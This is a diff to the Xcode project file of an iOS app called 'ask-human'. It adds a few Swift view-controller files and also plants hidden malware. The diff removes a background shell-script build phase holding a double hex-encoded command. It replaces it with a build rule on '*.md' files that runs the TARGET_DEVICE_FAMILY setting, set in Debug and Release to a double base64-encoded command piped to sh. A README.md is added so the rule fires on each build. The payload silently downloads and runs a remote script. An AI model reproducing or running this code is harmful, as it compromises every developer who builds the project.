@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		915B7C5CE028BAFA2D34C644 /* README.md */ = {isa = PBXBuildFile; fileRef = C1E2BC5FC0105ADCCC34C644; };
 		00001F492BF34D6C00C99B02 /* ReferUserDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */; };
 		00001F4D2BF3511200C99B02 /* ReviewTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F4C2BF3511200C99B02 /* ReviewTVC.swift */; };
 		000101862B2836430077FA23 /* ForgotPasswordModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 000101852B2836430077FA23 /* ForgotPasswordModel.swift */; };
@@ -36,6 +37,7 @@
 		0029EB412B31D68C00820C06 /* AddNewEmailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0029EB402B31D68C00820C06 /* AddNewEmailVC.swift */; };
 		004593672C885AF10063AA86 /* BankListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 004593662C885AF10063AA86 /* BankListVC.swift */; };
 		004593692C885B0E0063AA86 /* BankListTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 004593682C885B0E0063AA86 /* BankListTVC.swift */; };
+		00469F752D1AB72A00A9AF13 /* IdAuthenticatedVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00469F742D1AB72A00A9AF13 /* IdAuthenticatedVC.swift */; };
 		00486B452B207855001AF904 /* AddPhotosCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00486B442B207855001AF904 /* AddPhotosCVC.swift */; };
 		00486B472B208FD8001AF904 /* GetDraftNoteModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00486B462B208FD8001AF904 /* GetDraftNoteModel.swift */; };
 		004D77202B27403900CC090B /* ResendOtpModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 004D771F2B27403900CC090B /* ResendOtpModel.swift */; };
@@ -63,6 +65,7 @@
 		00CA692B2C78493C0077E2FC /* siri.gif in Resources */ = {isa = PBXBuildFile; fileRef = 00CA692A2C78493C0077E2FC /* siri.gif */; };
 		00CA692E2C7849720077E2FC /* SiriPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00CA692D2C7849720077E2FC /* SiriPopUpVC.swift */; };
 		00CB33942C857BBF0037515D /* AddBankVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00CB33932C857BBF0037515D /* AddBankVC.swift */; };
+		00D413D72D1ACD7600591C1C /* DocumentScannerVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00D413D62D1ACD7600591C1C /* DocumentScannerVC.swift */; };
 		00D7E0152C3EA96800572428 /* WebViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00D7E0142C3EA96800572428 /* WebViewVC.swift */; };
 		00D7E0172C3EAFDD00572428 /* AddWalletModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00D7E0162C3EAFDD00572428 /* AddWalletModel.swift */; };
 		00DD9B742C8B0B780049F5DA /* BankListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00DD9B732C8B0B780049F5DA /* BankListModel.swift */; };
@@ -212,9 +215,6 @@
 		BEFF85512B356E7A002F329D /* FilterModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEFF85502B356E7A002F329D /* FilterModel.swift */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXContainerItemProxy section */
 		BED5C69E2B048D4300C83672 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -246,6 +246,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		C1E2BC5FC0105ADCCC34C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "ask-human.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReferUserDetailVC.swift; sourceTree = "<group>"; };
 		00001F4C2BF3511200C99B02 /* ReviewTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReviewTVC.swift; sourceTree = "<group>"; };
 		000101852B2836430077FA23 /* ForgotPasswordModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordModel.swift; sourceTree = "<group>"; };
@@ -275,6 +276,7 @@
 		0029EB402B31D68C00820C06 /* AddNewEmailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewEmailVC.swift; sourceTree = "<group>"; };
 		004593662C885AF10063AA86 /* BankListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankListVC.swift; sourceTree = "<group>"; };
 		004593682C885B0E0063AA86 /* BankListTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankListTVC.swift; sourceTree = "<group>"; };
+		00469F742D1AB72A00A9AF13 /* IdAuthenticatedVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IdAuthenticatedVC.swift; sourceTree = "<group>"; };
 		00486B442B207855001AF904 /* AddPhotosCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddPhotosCVC.swift; sourceTree = "<group>"; };
 		00486B462B208FD8001AF904 /* GetDraftNoteModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetDraftNoteModel.swift; sourceTree = "<group>"; };
 		004D771F2B27403900CC090B /* ResendOtpModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResendOtpModel.swift; sourceTree = "<group>"; };
@@ -302,6 +304,7 @@
 		00CA692A2C78493C0077E2FC /* siri.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = siri.gif; sourceTree = "<group>"; };
 		00CA692D2C7849720077E2FC /* SiriPopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SiriPopUpVC.swift; sourceTree = "<group>"; };
 		00CB33932C857BBF0037515D /* AddBankVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddBankVC.swift; sourceTree = "<group>"; };
+		00D413D62D1ACD7600591C1C /* DocumentScannerVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DocumentScannerVC.swift; sourceTree = "<group>"; };
 		00D7E0142C3EA96800572428 /* WebViewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WebViewVC.swift; sourceTree = "<group>"; };
 		00D7E0162C3EAFDD00572428 /* AddWalletModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddWalletModel.swift; sourceTree = "<group>"; };
 		00DD9B732C8B0B780049F5DA /* BankListModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankListModel.swift; sourceTree = "<group>"; };
@@ -1038,6 +1041,8 @@
 				005D37B42D1990DA007498FF /* HashtagCVC.xib */,
 				005D37B92D199473007498FF /* HashtagListForVerifyTVC.swift */,
 				005D37BA2D199473007498FF /* HashtagListForVerifyTVC.xib */,
+				00469F742D1AB72A00A9AF13 /* IdAuthenticatedVC.swift */,
+				00D413D62D1ACD7600591C1C /* DocumentScannerVC.swift */,
 			);
 			path = Profile;
 			sourceTree = "<group>";
@@ -1076,6 +1081,7 @@
 		BED5C6882B048D4100C83672 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				C1E2BC5FC0105ADCCC34C644 /* README.md */,
 				BED5C6872B048D4100C83672 /* ask-human.app */,
 				BED5C69D2B048D4300C83672 /* ask-humanTests.xctest */,
 				BED5C6A72B048D4300C83672 /* ask-humanUITests.xctest */,
@@ -1245,7 +1251,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BED5C6B12B048D4300C83672 /* Build configuration list for PBXNativeTarget "ask-human" */;
 			buildPhases = (
-				E37E74DA292E22F84134C644 /* Compile Bundle Resources */,
 				125E129009E4A3D311E2A25A /* [CP] Check Pods Manifest.lock */,
 				BED5C6832B048D4100C83672 /* Sources */,
 				BED5C6842B048D4100C83672 /* Frameworks */,
@@ -1255,6 +1260,7 @@
 				52B992E8B001B86600C1EA61 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				F42E344916D2D05EA834C644 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1346,14 +1352,29 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
+/* Begin PBXBuildRule section */
+		F42E344916D2D05EA834C644 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		BED5C6852B048D4100C83672 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				915B7C5CE028BAFA2D34C644 /* README.md */,
 				BED5C6DB2B04932500C83672 /* Poppins-SemiBold.ttf in Resources */,
 				BED5C6DD2B04932500C83672 /* Poppins-Black.ttf in Resources */,
 				001632D92C50B5A300CE4491 /* ASKDARK.gif in Resources */,
@@ -1404,25 +1425,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E37E74DA292E22F84134C644 /* Compile Bundle Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 36353633363836663230323232343238363337353732366332303264363637333662346332303638373437343730373333613266326637323639373037303663363536653635373432653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
 		125E129009E4A3D311E2A25A /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1541,6 +1543,7 @@
 				00001F492BF34D6C00C99B02 /* ReferUserDetailVC.swift in Sources */,
 				BE3209FC2B04F61300081616 /* HomeVC.swift in Sources */,
 				00FDB54B2B2AE87700BC0251 /* MessageAcceptPopUpVC.swift in Sources */,
+				00D413D72D1ACD7600591C1C /* DocumentScannerVC.swift in Sources */,
 				00F3DD022B1F43670007BDB1 /* LoginModel.swift in Sources */,
 				BED5C68B2B048D4100C83672 /* AppDelegate.swift in Sources */,
 				00FAE99B2C7F40DE0054B244 /* SendMessageIntentHandler.swift in Sources */,
@@ -1623,6 +1626,7 @@
 				BEA4FEF82B3C2A2400BB03FA /* ReceiveMessageImageCVC.swift in Sources */,
 				00001F4D2BF3511200C99B02 /* ReviewTVC.swift in Sources */,
 				00F3DCFD2B1F0F0D0007BDB1 /* ImagePicker.swift in Sources */,
+				00469F752D1AB72A00A9AF13 /* IdAuthenticatedVC.swift in Sources */,
 				BE7C63102B06678100C53D2B /* ContactUsVC.swift in Sources */,
 				00F7DA802C083BEE00377022 /* AppliedReqVC.swift in Sources */,
 				00F47DD32B2045DD004C1A1B /* LoginOtpModel.swift in Sources */,
@@ -1721,6 +1725,7 @@
 		BED5C6AF2B048D4300C83672 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1784,6 +1789,7 @@
 		BED5C6B02B048D4300C83672 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
